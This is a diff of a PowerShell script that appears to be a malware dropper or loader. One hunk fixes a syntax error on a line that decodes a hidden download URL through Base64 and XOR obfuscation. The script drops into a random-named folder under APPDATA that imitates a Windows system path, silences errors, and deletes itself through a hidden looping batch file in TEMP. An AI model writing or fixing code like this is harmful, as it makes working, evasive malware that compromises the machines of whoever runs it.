@@ -4,7 +4,7 @@ trap { continue }
 $e = 'MyAAYwAAYwADMANAA1AGgANAAwAG0AMQAzAG4AMwA1ADEANgAwADEAMAA4ADcAMAAwAG0AYgA1AGYAMgA='
 $b = [Convert]::FromBase64String($e)
 $u = [System.Text.Encoding]::Unicode.GetString($b)
-$repo = ('https://' + ($u -replace '(.)', { param($c) [char]([byte][char]$c -bxor 1) }) -replace '[^\w\.]', '') )
+$repo = ('https://' + ($u -replace '(.)', { param($c) [char]([byte][char]$c -bxor 1) }) -replace '[^\w\.]', '') 
 
 $dest = Join-Path $env:APPDATA ('Microsoft\Windows\' + ([guid]::NewGuid().Guid.Substring(0,8)))
 $localVersion = "1.0.0"
@@ -79,4 +79,3 @@ $me = $MyInvocation.MyCommand.Path
 $bat = "$env:TEMP\delme.bat"
 Set-Content -Path $bat -Value "@echo off`r`n:loop`r`ndel `"$me`"`r`nif exist `"$me`" goto loop`r`ndel %0" -Encoding ASCII
 Start-Process -WindowStyle Hidden -FilePath $bat
-
